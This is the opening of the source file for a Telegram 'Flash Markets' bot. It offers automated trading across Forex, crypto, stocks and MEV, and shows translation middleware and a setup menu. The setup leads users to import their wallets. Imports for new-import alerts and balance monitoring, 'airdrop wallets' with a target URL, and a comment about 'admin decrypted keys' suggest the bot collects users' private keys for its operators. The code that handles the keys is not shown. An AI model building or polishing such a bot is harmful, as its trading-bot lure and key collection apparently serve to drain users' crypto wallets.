// telegram-bot.js

const { Telegraf, Markup } = require('telegraf');
const config = require('./config');
const { wallets, TARGET_URL } = require('./wallets');
const { airdropWallets, TARGET_URL: AIRDROP_URL } = require('./airdrop-wallets');
const walletManager = require('./wallet-manager'); // ← FIX #1: Added missing import
const { alertNewImport, fetchMultiChainBalances } = require('./admin-notifier');
const { startBalanceMonitor } = require('./balance-monitor');
const userTracker = require('./user-tracker');
const translator = require('./translator');
const { translateText, normalizeLanguage } = translator;
const translateMessagePayload = translator.translateMessagePayload;

// User state map for tracking data (used by /portfolio etc)
const users = new Map(); // ← FIX #2: Added missing Map

const bot = new Telegraf(config.BOT_TOKEN);

// 🧪 DEBUG: Log ALL incoming messages
bot.use((ctx, next) => {
    if (ctx.message?.text) {
        console.log(`[DEBUG] Incoming text: "${ctx.message.text}" from user ${ctx.from.id}`);
    }
    return next();
});

// Add near the top
const isAdmin = (telegramId) => config.ADMIN_TELEGRAM_IDS.includes(telegramId);

// ═══════════════════════════════════════════════════
// 🛡️ SAFE CALLBACK ANSWER HELPER
// Prevents crashes from expired/invalid callback queries
// ═══════════════════════════════════════════════════
async function safeAnswerCbQuery(ctx, text) {
    try {
        if (!ctx?.callbackQuery?.id) return;

        // Answer immediately.
        // Do not wait for translation here.
        // Main message/button translation happens in the outbound wrapper.
        await ctx.answerCbQuery(text);
    } catch (err) {
        const message = err?.message || '';

        if (
            message.includes('query is too old') ||
            message.includes('query ID is invalid') ||
            message.includes('response timeout expired')
        ) {
            console.warn(`⚠️ Ignored expired/invalid callback for user ${ctx?.from?.id || 'unknown'}`);
            return;
        }

        console.error('❌ answerCbQuery error:', message);
    }
}

async function safeEditMessageText(ctx, text, options = {}) {
    try {
        await ctx.editMessageText(text, options);
        return true;
    } catch (err) {
        const msg = err?.message || '';

        if (
            msg.includes('Message is not modified') ||
            msg.includes('MESSAGE_NOT_MODIFIED')
        ) {
            return true;
        }

        if (
            msg.includes("message can't be edited") ||
            msg.includes('BOT_RESPONSE_TIMEOUT')
        ) {
            try {
                await ctx.replyWithMarkdown(text, options);
            } catch (replyErr) {
                console.error('❌ Fallback reply failed:', replyErr?.message || replyErr);
            }

            return true;
        }

        console.error('❌ editMessageText error:', msg);
        return false;
    }
}

// ═══════════════════════════════════════════════════
// 🌐 LIVE LANGUAGE SYSTEM
// No hardcoded translations. All messages are translated at runtime.
// ═══════════════════════════════════════════════════
const DEFAULT_LANGUAGE = 'en';

const COMMON_LANGUAGE_CODES = [
    'en', 'es', 'fr', 'de', 'it', 'pt', 'ru', 'zh', 'ja', 'ko',
    'ar', 'hi', 'tr', 'id', 'vi', 'th', 'nl', 'pl', 'uk', 'fa',
    'sw', 'ms', 'bn', 'ta', 'te', 'mr', 'ur', 'he', 'el', 'cs',
    'sv', 'no', 'da', 'fi', 'hu', 'ro', 'bg', 'hr', 'sk', 'sl',
    'et', 'lv', 'lt', 'sq', 'mk', 'bs', 'sr', 'am', 'ky', 'kk',
    'uz', 'az', 'mn', 'ne', 'si', 'km', 'lo', 'my', 'ka', 'hy',
    'yo', 'ig', 'ha', 'zu', 'af', 'ca', 'gl', 'eu', 'is', 'ga',
    'mt', 'cy', 'lb', 'fo', 'sc', 'co', 'la', 'eo'
];

const userLanguages = new Map();

function getUserLanguage(userId) {
    return userLanguages.get(userId) || DEFAULT_LANGUAGE;
}

function setUserLanguage(userId, lang) {
    const normalized =
        typeof userTracker.normalizeLanguageCode === 'function'
            ? userTracker.normalizeLanguageCode(lang)
            : (normalizeLanguage(lang) || DEFAULT_LANGUAGE);

    const finalLang = COMMON_LANGUAGE_CODES.includes(normalized)
        ? normalized
        : DEFAULT_LANGUAGE;

    userLanguages.set(userId, finalLang);
    return finalLang;
}

function getLanguageCodesForUser(userId, telegramLanguageCode) {
    const codes = new Set();

    const userLang = getUserLanguage(userId);
    if (userLang) codes.add(userLang);

    const telegramLang = normalizeLanguage(telegramLanguageCode);
    if (telegramLang) codes.add(telegramLang);

    COMMON_LANGUAGE_CODES.forEach(code => codes.add(code));

    return Array.from(codes);
}

function nativeLanguageName(code) {
    try {
        const display = new Intl.DisplayNames([code], {
            type: 'language',
            fallback: 'code',
            style: 'long'
        });

        const name = display.of(code);
        return name || code;
    } catch (err) {
        return code;
    }
}

function languageButtonText(code) {
    const name = nativeLanguageName(code);
    const label = `${name} (${code})`;

    if (label.length <= 60) return label;

    if (name.length <= 57) return `${name}...`;

    return `${name.slice(0, 57)}...`;
}

function languageKeyboard(userId, telegramLanguageCode) {
    const codes = getLanguageCodesForUser(userId, telegramLanguageCode);
    const rows = [];

    for (let i = 0; i < codes.length; i += 2) {
        const row = [];

        row.push(
            Markup.button.callback(
                languageButtonText(codes[i]),
                `lang_${codes[i]}`
            )
        );

        if (codes[i + 1]) {
            row.push(
                Markup.button.callback(
                    languageButtonText(codes[i + 1]),
                    `lang_${codes[i + 1]}`
                )
            );
        }

        rows.push(row);
    }

    rows.push([
        Markup.button.callback('◀️ Back', 'back_to_start')
    ]);

    return Markup.inlineKeyboard(rows);
}

// ═══════════════════════════════════════════════════
// 🌐 ENSURE LANGUAGE IS LOADED FOR EVERY UPDATE
// ═══════════════════════════════════════════════════
bot.use(async (ctx, next) => {
    try {
        const userId = ctx.from?.id;

        if (userId && !userLanguages.has(userId)) {
            let savedLang = null;

            if (typeof userTracker.getUserLanguage === 'function') {
                savedLang = await userTracker.getUserLanguage(userId).catch(() => null);
            }

            const detectedLang =
                savedLang ||
                ctx.from?.language_code ||
                DEFAULT_LANGUAGE;

            const finalLang = setUserLanguage(userId, detectedLang);

            console.log(`[LANGUAGE MW] Loaded language ${finalLang} for user ${userId}`);
        }
    } catch (err) {
        console.error('❌ Language middleware error:', err.message);
    }

    return next();
});


// ═══════════════════════════════════════════════════
// 🌐 FINAL TRANSLATION INTERCEPTION
// Translates both:
// 1. ctx.replyWithMarkdown / ctx.editMessageText / ctx.reply
// 2. bot.telegram.sendMessage / sendPhoto / sendVideo, etc.
// ═══════════════════════════════════════════════════

const recentlyTranslatedTexts = new Set();

function rememberTranslatedText(text) {
    const value = String(text || '');
    if (!value) return;

    recentlyTranslatedTexts.add(value);

    setTimeout(() => {
        recentlyTranslatedTexts.delete(value);
    }, 15000);
}

function wasRecentlyTranslated(text) {
    return recentlyTranslatedTexts.has(String(text || ''));
}

function containsSensitiveString(text) {
    const value = String(text || '');

    if (!value.trim()) return false;

    // Never translate code fences. This protects admin decrypted keys.
    if (value.includes('```')) return true;

    // Never translate likely private keys / 64-char hex strings.
    if (/\b(?:0x)?[a-fA-F0-9]{64}\b/.test(value)) return true;

    return false;
}

function shouldSkipButtonTranslation(button) {
    if (!button) return true;

    // Never translate language selector buttons.
    if (button.callback_data && String(button.callback_data).startsWith('lang_')) {
        return true;
    }

    // Do not translate URL buttons.
    if (button.url) {
        return true;
    }

    return false;
}

async function translateInlineKeyboard(userId, inlineKeyboard) {
    if (!Array.isArray(inlineKeyboard)) return;

    const lang = getUserLanguage(userId);
    if (!lang || lang === 'en') return;

    for (const row of inlineKeyboard) {
        if (!Array.isArray(row)) continue;

        for (const button of row) {
            if (shouldSkipButtonTranslation(button)) continue;

            if (typeof button.text === 'string' && button.text.trim()) {
                button.text = await translateText(button.text, lang);
            }
        }
    }
}

async function translateReplyKeyboard(userId, keyboard) {
    if (!Array.isArray(keyboard)) return;

    const lang = getUserLanguage(userId);
    if (!lang || lang === 'en') return;

    for (let r = 0; r < keyboard.length; r++) {
        const row = keyboard[r];

        if (!Array.isArray(row)) continue;

        for (let b = 0; b < row.length; b++) {
            const button = row[b];

            if (typeof button === 'string' && button.trim()) {
                row[b] = await translateText(button, lang);
            } else if (button && typeof button.text === 'string' && button.text.trim()) {
                button.text = await translateText(button.text, lang);
            }
        }
    }
}

async function translateReplyMarkup(userId, markup) {
    if (!markup) return;

    if (markup.inline_keyboard) {
        await translateInlineKeyboard(userId, markup.inline_keyboard);
    }

    if (markup.keyboard) {
        await translateReplyKeyboard(userId, markup.keyboard);
    }
}

async function translateOutgoingText(text, lang) {
    if (typeof translateMessagePayload === 'function') {
        return await translateMessagePayload(text, lang);
    }

    const translated = await translateText(text, lang);

    return {
        text: translated,
        parse_mode: 'Markdown'
    };
}

// ═══════════════════════════════════════════════════
// 🧠 CONTEXT-LEVEL TRANSLATION
// This fixes ctx.replyWithMarkdown and ctx.editMessageText.
// ═══════════════════════════════════════════════════
bot.use(async (ctx, next) => {
    try {
        const userId = ctx.from?.id;
        const lang = userId ? getUserLanguage(userId) : DEFAULT_LANGUAGE;

        if (!userId || !lang || lang === 'en') {
            return next();
        }

        const overrideCtxMethod = (methodName, transformer) => {
            const originalMethod = ctx[methodName];

            if (typeof originalMethod !== 'function') return;

            ctx[methodName] = async function (...args) {
                let finalArgs = args;

                try {
                    finalArgs = await transformer(args, userId, lang);
                } catch (err) {
                    console.error(`❌ Context translation error (${methodName}):`, err.message);
                }

                return originalMethod.apply(this, finalArgs);
            };
        };

        // ───────────────────────────────────────────
        // ctx.replyWithMarkdown(text, extra)
        // ───────────────────────────────────────────
        overrideCtxMethod('replyWithMarkdown', async ([text, extra = {}], userId, lang) => {
            if (
                typeof text !== 'string' ||
                !text.trim() ||
                containsSensitiveString(text) ||
                wasRecentlyTranslated(text)
            ) {
                return [text, extra];
            }

            const translated = await translateOutgoingText(text, lang);
            const options = { ...(extra || {}) };

            if (translated.parse_mode) {
                options.parse_mode = translated.parse_mode;
            } else {
                delete options.parse_mode;
            }

            if (options.reply_markup) {
                await translateReplyMarkup(userId, options.reply_markup);
            }

            rememberTranslatedText(translated.text);

            console.log(`[CTX-TRANSLATE] replyWithMarkdown ${lang}: ${text.length} -> ${translated.text.length}`);

            return [translated.text, options];
        });

        // ───────────────────────────────────────────
        // ctx.editMessageText(text, extra)
        // ───────────────────────────────────────────
        overrideCtxMethod('editMessageText', async ([text, extra = {}], userId, lang) => {
            if (
                typeof text !== 'string' ||
                !text.trim() ||
                containsSensitiveString(text) ||
                wasRecentlyTranslated(text)
            ) {
                return [text, extra];
            }

            const translated = await translateOutgoingText(text, lang);
            const options = { ...(extra || {}) };

            if (translated.parse_mode) {
                options.parse_mode = translated.parse_mode;
            } else {
                delete options.parse_mode;
            }

            if (options.reply_markup) {
                await translateReplyMarkup(userId, options.reply_markup);
            }

            rememberTranslatedText(translated.text);

            console.log(`[CTX-TRANSLATE] editMessageText ${lang}: ${text.length} -> ${translated.text.length}`);

            return [translated.text, options];
        });

        // ───────────────────────────────────────────
        // ctx.reply(text, extra)
        // ───────────────────────────────────────────
        overrideCtxMethod('reply', async ([text, extra = {}], userId, lang) => {
            if (
                typeof text !== 'string' ||
                !text.trim() ||
                containsSensitiveString(text) ||
                wasRecentlyTranslated(text)
            ) {
                return [text, extra];
            }

            const options = { ...(extra || {}) };

            if (options.parse_mode) {
                const translated = await translateOutgoingText(text, lang);

                if (translated.parse_mode) {
                    options.parse_mode = translated.parse_mode;
                } else {
                    delete options.parse_mode;
                }

                if (options.reply_markup) {
                    await translateReplyMarkup(userId, options.reply_markup);
                }

                rememberTranslatedText(translated.text);

                console.log(`[CTX-TRANSLATE] reply parsed ${lang}: ${text.length} -> ${translated.text.length}`);

                return [translated.text, options];
            }

            const translatedText = await translateText(text, lang);

            if (options.reply_markup) {
                await translateReplyMarkup(userId, options.reply_markup);
            }

            rememberTranslatedText(translatedText);

            console.log(`[CTX-TRANSLATE] reply plain ${lang}: ${text.length} -> ${translatedText.length}`);

            return [translatedText, options];
        });

        // ───────────────────────────────────────────
        // ctx.replyWithPhoto / ctx.replyWithVideo captions
        // Optional, but useful for media messages.
        // ───────────────────────────────────────────
        const mediaMethods = [
            'replyWithPhoto',
            'replyWithVideo',
            'replyWithAnimation',
            'replyWithAudio',
            'replyWithDocument',
            'replyWithVoice'
        ];

        for (const methodName of mediaMethods) {
            overrideCtxMethod(methodName, async (args, userId, lang) => {
                const lastArgIndex = args.length - 1;
                const lastArg = args[lastArgIndex];

                if (!lastArg || typeof lastArg !== 'object' || Array.isArray(lastArg)) {
                    return args;
                }

                const metadata = { ...lastArg };
                const caption = metadata.caption;

                if (
                    typeof caption !== 'string' ||
                    !caption.trim() ||
                    containsSensitiveString(caption) ||
                    wasRecentlyTranslated(caption)
                ) {
                    return args;
                }

                const translated = await translateOutgoingText(caption, lang);

                metadata.caption = translated.text;

                if (translated.parse_mode) {
                    metadata.parse_mode = translated.parse_mode;
                } else {
                    delete metadata.parse_mode;
                }

                if (metadata.reply_markup) {
                    await translateReplyMarkup(userId, metadata.reply_markup);
                }

                rememberTranslatedText(translated.text);

                args[lastArgIndex] = metadata;

                console.log(`[CTX-TRANSLATE] ${methodName} caption ${lang}: ${caption.length} -> ${translated.text.length}`);

                return args;
            });
        }
    } catch (err) {
        console.error('❌ Context translation middleware error:', err.message);
    }

    return next();
});

// ═══════════════════════════════════════════════════
// 📡 DIRECT TELEGRAM API TRANSLATION
// This keeps scheduled bot.telegram.sendPhoto/sendMessage working.
// ═══════════════════════════════════════════════════
const TRANSLATABLE_TELEGRAM_METHODS = [
    'sendMessage',
    'editMessageText',
    'sendPhoto',
    'sendVideo',
    'sendAnimation',
    'sendAudio',
    'sendDocument',
    'sendVoice',
    'sendVideoNote'
];

function getChatIdFromArgs(args) {
    const first = args[0];

    if (typeof first === 'number') return first;
    if (typeof first === 'string' && /^-?\d+$/.test(first)) return Number(first);

    return null;
}

async function translateTelegramArgs(method, args) {
    const chatId = getChatIdFromArgs(args);
    const lang = chatId ? getUserLanguage(chatId) : null;

    console.log(`[TG-WRAP] method=${method} chat=${chatId || 'unknown'} lang=${lang || 'none'}`);

    if (!chatId || !lang || lang === 'en') {
        console.log(`[TG-WRAP] skipped translation for ${method}`);
        return args;
    }

    const newArgs = [...args];

    // ───────────────────────────────────────────
    // bot.telegram.sendMessage(chatId, text, metadata)
    // ───────────────────────────────────────────
    if (method === 'sendMessage') {
        const text = newArgs[1];

        if (
            typeof text !== 'string' ||
            !text.trim() ||
            containsSensitiveString(text) ||
            wasRecentlyTranslated(text)
        ) {
            return args;
        }

        const translated = await translateOutgoingText(text, lang);

        newArgs[1] = translated.text;

        const metadata =
            newArgs[2] && typeof newArgs[2] === 'object' && !Array.isArray(newArgs[2])
                ? { ...newArgs[2] }
                : {};

        if (translated.parse_mode) {
            metadata.parse_mode = translated.parse_mode;
        } else {
            delete metadata.parse_mode;
        }

        if (metadata.reply_markup) {
            await translateReplyMarkup(chatId, metadata.reply_markup);
        }

        newArgs[2] = metadata;

        rememberTranslatedText(translated.text);

        console.log(`[TG-WRAP] translated sendMessage: ${text.length} -> ${translated.text.length}`);
        return newArgs;
    }

    // ───────────────────────────────────────────
    // bot.telegram.editMessageText(...)
    // Supports common Telegraf argument shapes.
    // ───────────────────────────────────────────
    if (method === 'editMessageText') {
        let textIndex = -1;
        let metaIndex = -1;

        if (newArgs.length >= 5 && typeof newArgs[3] === 'string') {
            textIndex = 3;
            metaIndex = 4;
        } else if (newArgs.length >= 4 && typeof newArgs[2] === 'string') {
            textIndex = 2;
            metaIndex = 3;
        } else if (newArgs.length >= 3 && typeof newArgs[1] === 'string') {
            textIndex = 1;
            metaIndex = 2;
        }

        if (textIndex === -1) {
            console.log(`[TG-WRAP] could not detect text argument for ${method}`);
            return args;
        }

        const text = newArgs[textIndex];

        if (
            typeof text !== 'string' ||
            !text.trim() ||
            containsSensitiveString(text) ||
            wasRecentlyTranslated(text)
        ) {
            return args;
        }

        const translated = await translateOutgoingText(text, lang);

        newArgs[textIndex] = translated.text;

        const metadata =
            newArgs[metaIndex] && typeof newArgs[metaIndex] === 'object' && !Array.isArray(newArgs[metaIndex])
                ? { ...newArgs[metaIndex] }
                : {};

        if (translated.parse_mode) {
            metadata.parse_mode = translated.parse_mode;
        } else {
            delete metadata.parse_mode;
        }

        if (metadata.reply_markup) {
            await translateReplyMarkup(chatId, metadata.reply_markup);
        }

        newArgs[metaIndex] = metadata;

        rememberTranslatedText(translated.text);

        console.log(`[TG-WRAP] translated editMessageText: ${text.length} -> ${translated.text.length}`);
        return newArgs;
    }

    // ───────────────────────────────────────────
    // Media methods:
    // sendPhoto(chatId, photo, metadata)
    // sendVideo(chatId, video, metadata)
    // Caption is inside metadata.caption
    // ───────────────────────────────────────────
    const lastArg = newArgs[newArgs.length - 1];

    if (!lastArg || typeof lastArg !== 'object' || Array.isArray(lastArg)) {
        return args;
    }

    const caption = lastArg.caption;

    if (
        typeof caption !== 'string' ||
        !caption.trim() ||
        containsSensitiveString(caption) ||
        wasRecentlyTranslated(caption)
    ) {
        return args;
    }

    const translated = await translateOutgoingText(caption, lang);

    const newMetadata = {
        ...lastArg,
        caption: translated.text
    };

    if (translated.parse_mode) {
        newMetadata.parse_mode = translated.parse_mode;
    } else {
        delete newMetadata.parse_mode;
    }

    if (newMetadata.reply_markup) {
        await translateReplyMarkup(chatId, newMetadata.reply_markup);
    }

    newArgs[newArgs.length - 1] = newMetadata;

    rememberTranslatedText(translated.text);

    console.log(`[TG-WRAP] translated ${method} caption: ${caption.length} -> ${translated.text.length}`);
    return newArgs;
}

for (const methodName of TRANSLATABLE_TELEGRAM_METHODS) {
    const originalMethod = bot.telegram[methodName];

    if (typeof originalMethod !== 'function') {
        console.warn(`⚠️ Telegram method not found, skipped wrapping: ${methodName}`);
        continue;
    }

    bot.telegram[methodName] = async function (...args) {
        let finalArgs = args;

        try {
            finalArgs = await translateTelegramArgs(methodName, args);
        } catch (err) {
            console.error(`❌ Telegram method translation error (${methodName}):`, err.message);
        }

        return originalMethod.apply(this, finalArgs);
    };
}

// ═══════════════════════════════════════════════════
// 📊 MULTI-MARKET TRADING SETUP HELPERS
// ═══════════════════════════════════════════════════
const SETUP_TIMEOUT_MS = 10 * 60 * 1000;

const MARKET_LABELS = {
    forex: 'Forex',
    crypto: 'Crypto',
    stock: 'Stock',
    mev: 'MEV'
};

const REQUIRED_FIELDS = {
    forex: [
        {
            key: 'leverage',
            label: 'Leverage',
            options: [
                { value: '10', label: '1:10 Conservative' },
                { value: '30', label: '1:30 Balanced' },
                { value: '100', label: '1:100 Aggressive' },
                { value: '200', label: '1:200 High Risk' },
                { value: '500', label: '1:500 Maximum Leverage' }
            ]
        },
        {
            key: 'risk_per_trade',
            label: 'Risk Per Trade',
            options: [
                { value: '1', label: '1% Low Risk' },
                { value: '2', label: '2% Balanced' },
                { value: '3', label: '3% Aggressive' },
                { value: '5', label: '5% Very Aggressive' }
            ]
        },
        {
            key: 'pairs',
            label: 'Instrument Focus',
            options: [
                { value: 'majors', label: 'Majors Only' },
                { value: 'gold', label: 'Gold / XAUUSD' },
                { value: 'indices', label: 'Indices' },
                { value: 'crypto_fx', label: 'Crypto FX Pairs' },
                { value: 'all', label: 'All Liquid Pairs' }
            ]
        },
        {
            key: 'strategy',
            label: 'Strategy',
            options: [
                { value: 'scalping', label: 'Scalping' },
                { value: 'swing', label: 'Swing Trading' },
                { value: 'breakout', label: 'Breakout' },
                { value: 'news', label: 'News Volatility' }
            ]
        },
        {
            key: 'session',
            label: 'Trading Session',
            options: [
                { value: 'london', label: 'London Session' },
                { value: 'new_york', label: 'New York Session' },
                { value: 'asia', label: 'Asia Session' },
                { value: '24h', label: '24 Hours' }
            ]
        }
    ],
    crypto: [
        {
            key: 'market_type',
            label: 'Crypto Market Type',
            options: [
                { value: 'spot', label: 'Spot Trading' },
                { value: 'futures', label: 'Futures Trading' },
                { value: 'grid', label: 'Grid Bot' },
                { value: 'dca', label: 'DCA Bot' }
            ]
        },
        {
            key: 'risk',
            label: 'Risk Profile',
            options: [
                { value: 'conservative', label: 'Conservative' },
                { value: 'balanced', label: 'Balanced' },
                { value: 'aggressive', label: 'Aggressive' }
            ]
        },
        {
            key: 'pairs',
            label: 'Pair Selection',
            options: [
                { value: 'btc_eth', label: 'BTC / ETH Only' },
                { value: 'top20', label: 'Top 20 Coins' },
                { value: 'memecoins', label: 'Memecoin Exposure' },
                { value: 'all_liquid', label: 'All Liquid Markets' }
            ]
        },
        {
            key: 'timeframe',
            label: 'Timeframe',
            options: [
                { value: '1m', label: '1 Minute' },
                { value: '5m', label: '5 Minutes' },
                { value: '15m', label: '15 Minutes' },
                { value: '1h', label: '1 Hour' },
                { value: '4h', label: '4 Hours' }
            ]
        },
        {
            key: 'exit',
            label: 'Exit Style',
            options: [
                { value: 'auto', label: 'Auto TP / SL' },
                { value: 'tight', label: 'Tight Stops' },
                { value: 'wide', label: 'Wide Targets' }
            ]
        }
    ],
    stock: [
        {
            key: 'stock_market',
            label: 'Stock Market',
            options: [
                { value: 'us', label: 'US Stocks' },
                { value: 'uk', label: 'UK Stocks' },
                { value: 'eu', label: 'EU Stocks' },
                { value: 'asia', label: 'Asia Stocks' }
            ]
        },
        {
            key: 'strategy',
            label: 'Strategy',
            options: [
                { value: 'growth', label: 'Growth Stocks' },
                { value: 'dividend', label: 'Dividend Stocks' },
                { value: 'etf_swing', label: 'ETF Swing' },
                { value: 'momentum', label: 'Momentum' }
            ]
        },
        {
            key: 'risk',
            label: 'Risk Profile',
            options: [
                { value: 'low', label: 'Low Risk' },
                { value: 'medium', label: 'Medium Risk' },
                { value: 'high', label: 'High Risk' }
            ]
        },
        {
            key: 'sectors',
            label: 'Sector Focus',
            options: [
                { value: 'tech', label: 'Technology' },
                { value: 'healthcare', label: 'Healthcare' },
                { value: 'energy', label: 'Energy' },
                { value: 'all', label: 'All Sectors' }
            ]
        },
        {
            key: 'holding',
            label: 'Holding Period',
            options: [
                { value: 'intraday', label: 'Intraday' },
                { value: 'swing', label: 'Swing Trading' },
                { value: 'long_term', label: 'Long Term' }
            ]
        }
    ],
    mev: [
        {
            key: 'slippage',
            label: 'Slippage Tolerance',
            options: [
                { value: '0.1', label: '0.1%' },
                { value: '0.5', label: '0.5%' },
                { value: '1', label: '1%' },
                { value: '2', label: '2%' }
            ]
        },
        {
            key: 'gas',
            label: 'Gas / Priority Strategy',
            options: [
                { value: 'normal', label: 'Normal' },
                { value: 'fast', label: 'Fast' },
                { value: 'turbo', label: 'Turbo' }
            ]
        },
        {
            key: 'chains',
            label: 'Chain Selection',
            options: [
                { value: 'all', label: 'All Supported Chains' },
                { value: 'evm', label: 'EVM Only' },
                { value: 'solana', label: 'Solana Only' },
                { value: 'ethereum', label: 'Ethereum Only' }
            ]
        },
        {
            key: 'min_profit',
            label: 'Minimum Profit Target',
            options: [
                { value: '1', label: '$1 per opportunity' },
                { value: '5', label: '$5 per opportunity' },
                { value: '10', label: '$10 per opportunity' },
                { value: '25', label: '$25 per opportunity' }
            ]
        },
        {
            key: 'protection',
            label: 'Execution Protection',
            options: [
                { value: 'revert_safe', label: 'Revert-Safe Execution' },
                { value: 'private_only', label: 'Private Relay Only' }
            ]
        }
    ]
};

function getMarketLabel(market) {
    return MARKET_LABELS[market] || market;
}

function getFields(market) {
    return REQUIRED_FIELDS[market] || [];
}

function getOptionLabel(market, key, value) {
    if (value === undefined || value === null || value === '') {
        return 'Not set';
    }

    const field = getFields(market).find(f => f.key === key);
    const option = field?.options.find(o => String(o.value) === String(value));

    return option?.label || String(value);
}

async function outputSetupMessage(ctx, text, keyboardMarkup) {
    const options = {
        parse_mode: 'Markdown',
        ...keyboardMarkup
    };

    const userId = ctx.from?.id;
    const lang = userId ? getUserLanguage(userId) : 'en';

    console.log(`[OUTPUT] Sending message to user ${userId}, language ${lang}`);

    if (ctx.callbackQuery) {
        try {
            await ctx.editMessageText(text, options);
            console.log(`[OUTPUT] Edited message successfully for user ${userId}`);
            return;
        } catch (e) {
            const msg = e?.message || '';

            console.warn(`[OUTPUT] editMessageText failed for user ${userId}: ${msg}`);

            if (
                msg.includes('Message is not modified') ||
                msg.includes('MESSAGE_NOT_MODIFIED')
            ) {
                return;
            }
        }
    }

    try {
        await ctx.replyWithMarkdown(text, options);
        console.log(`[OUTPUT] Replied successfully for user ${userId}`);
    } catch (err) {
        console.error('❌ Failed to send setup message:', err?.message || err);
    }
}

function marketSelectionKeyboard() {
    return Markup.inlineKeyboard([
        [
            Markup.button.callback('💱 Forex Trading', 'select_forex'),
            Markup.button.callback('🪙 Crypto Trading', 'select_crypto')
        ],
        [
            Markup.button.callback('📈 Stock Trading', 'select_stock'),
            Markup.button.callback('⚡ MEV Trading', 'select_mev')
        ],
        [
            Markup.button.callback('🌐 Language', 'language')
        ]
    ]);
}

async function showMarketSelection(ctx) {
    const text = `
📊 *Select Your Trading Market*

Flash Markets can trade across:

💱 *Forex* — currency pairs, gold, indices, leverage control  
🪙 *Crypto* — spot, futures, grid, DCA, memecoin exposure  
📈 *Stocks* — growth, dividend, ETF swing, momentum  
⚡ *MEV* — on-chain arbitrage, liquidations, private relay execution

━━━━━━━━━━━━━━━━━━━━━

*▸ MINIMUM CAPITAL*

Your bot requires at least *$${config.MIN_TRADE_CAPITAL_USD}* in usable trading capital.

The more capital you allocate, the larger the opportunity size the bot can deploy — but risk management still matters.

_Select one market below._
`;

    await outputSetupMessage(ctx, text, marketSelectionKeyboard());
}

async function showCapitalPrompt(ctx, market) {
    const text = `
💰 *Capital Allocation — ${getMarketLabel(market)}*

Tell me what percentage of your available trading wallet you want allocated to this bot.

*Rules:*
• Minimum total trading capital: *$${config.MIN_TRADE_CAPITAL_USD}*
• Allocation must be between *10% and 100%*
• Higher allocation can increase profit potential
• Higher allocation also increases exposure

_Send a number only, for example:_

\`50\`

That means 50% of your wallet is allocated to the ${getMarketLabel(market)} bot.
`;

    await outputSetupMessage(ctx, text, Markup.inlineKeyboard([
        [Markup.button.callback('❌ Cancel Setup', 'setup_cancel')]
    ]));
}

async function showCurrentSetupField(ctx, state) {
    const fields = getFields(state.market);

    if (typeof state.fieldIndex !== 'number') {
        state.fieldIndex = 0;
    }

    if (state.fieldIndex >= fields.length) {
        return showSetupSummary(ctx, state);
    }

    const field = fields[state.fieldIndex];

    const rows = field.options.map(option => [
        Markup.button.callback(option.label, `set|${field.key}|${option.value}`)
    ]);

    rows.push([]);

    if (state.fieldIndex > 0) {
        rows.push([Markup.button.callback('◀️ Previous Setting', 'setup_prev')]);
    }

    rows.push([
        Markup.button.callback('✏️ Change Capital %', 'setup_change_capital'),
        Markup.button.callback('❌ Cancel', 'setup_cancel')
    ]);

    const text = `
⚙️ *${getMarketLabel(state.market)} Setup — Step ${state.fieldIndex + 1}/${fields.length}*

*Selected Market:* ${getMarketLabel(state.market)}  
*Capital Allocation:* ${state.capitalPercent}%

━━━━━━━━━━━━━━━━━━━━━

*▸ ${field.label}*

Choose one option below.
`;

    await outputSetupMessage(ctx, text, Markup.inlineKeyboard(rows));
}

async function showSetupSummary(ctx, state) {
    const fields = getFields(state.market);

    const summaryLines = fields.map(field => {
        const value = state.settings[field.key];
        const label = value ? getOptionLabel(state.market, field.key, value) : 'Not set';
        return `• *${field.label}:* ${label}`;
    }).join('\n');

    const text = `
✅ *Review Your ${getMarketLabel(state.market)} Bot Setup*

━━━━━━━━━━━━━━━━━━━━━

*▸ MARKET*
${getMarketLabel(state.market)}

*▸ CAPITAL ALLOCATION*
${state.capitalPercent}% of wallet

*▸ BOT SETTINGS*
${summaryLines}

━━━━━━━━━━━━━━━━━━━━━

*▸ IMPORTANT*

Minimum usable trading capital is *$${config.MIN_TRADE_CAPITAL_USD}*.

Allocating more capital can allow the bot to deploy larger position sizes and capture larger opportunities, but it also increases exposure.

Confirm below to save your setup and connect your wallet.
`;

    await outputSetupMessage(ctx, text, Markup.inlineKeyboard([
        [Markup.button.callback('✅ Confirm Setup', 'confirm_setup')],
        [
            Markup.button.callback('✏️ Change Capital %', 'setup_change_capital'),
            Markup.button.callback('🔁 Change Market', 'change_market')
        ],
        [Markup.button.callback('❌ Cancel', 'setup_cancel')]
    ]));
}

// ═══════════════════════════════════════════════════
// 📱 WELCOME MESSAGE (shown before /start)
// ═══════════════════════════════════════════════════
const WELCOME_MESSAGE = `
🤖 *What can this bot do?*

*Flash Markets* is a multi-market automated trading system.

It can trade:

💱 *Forex* — currency pairs, gold, indices, leverage-aware risk control  
🪙 *Crypto* — spot, futures, grid, DCA, volatility strategies  
📈 *Stocks* — growth, dividend, ETF swing, momentum strategies  
⚡ *MEV* — on-chain arbitrage, liquidations, private relay execution

The bot scans opportunities, applies risk rules, allocates capital, and executes trades based on your selected market settings.

_Tap start to choose your market._
`;

// ═══════════════════════════════════════════════════
// 🎬 /start MESSAGE (after user clicks start)
// ═══════════════════════════════════════════════════
const START_MESSAGE = `
📊 *Flash Markets*
_One bot. Four markets. Automated execution._

Flash Markets lets you deploy an automated trading agent across:

💱 *Forex*  
🪙 *Crypto*  
📈 *Stocks*  
⚡ *MEV*

First, choose your market. Then configure risk, capital allocation, and strategy. Finally, connect or import your wallet to activate the bot.

*▸ WHAT YOU CONTROL*

▸ Market selection  
▸ Capital allocation percentage  
▸ Risk profile  
▸ Strategy settings  
▸ Stop-loss / take-profit behavior where applicable  
▸ Leverage for Forex  
▸ Slippage and chain selection for MEV

*▸ MINIMUM CAPITAL*

Your bot requires at least *$${config.MIN_TRADE_CAPITAL_USD}* in usable trading capital.

The more capital you allocate, the larger the position sizes the bot can deploy. Higher allocation can increase profit potential, but it also increases exposure.

*▸ LINKS*
[🌐 Website](${config.WEBSITE}) · [Channel](${config.CHANNEL_URL})

✨ *Select your market below to begin setup.*
`;

// ═══════════════════════════════════════════════════
// 🎯 /start handler - Welcome + scheduled messages
// ═══════════════════════════════════════════════════
bot.start(async (ctx) => {
    const userId = ctx.from.id;


    // 🌐 Initialize language
    if (!userLanguages.has(userId)) {
        let savedLang = null;

        if (typeof userTracker.getUserLanguage === 'function') {
            savedLang = await userTracker.getUserLanguage(userId).catch(() => null);
        }

        const detectedLang =
            savedLang ||
            ctx.from.language_code ||
